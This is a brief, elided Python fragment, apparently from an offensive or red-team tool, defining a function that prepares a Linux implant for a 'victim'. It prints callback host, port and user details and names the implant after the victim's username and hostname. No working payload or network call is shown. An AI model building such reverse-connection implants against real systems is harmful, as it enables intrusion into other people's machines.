...
def makebackflip(backflipServer, victim, args):
    ...
    print(f"[*] callback host: {backflipServer.fqdn}")
    print(f"[*] callback port: {backflipServer.port}")
    print(f"[*] callback user: {backflipServer.user}")
    ...
    print(cmd)
    implantName = f"linux-{victim.username}-{victim.hostname}-{backflipServer.fqdn}-{payloadName}"
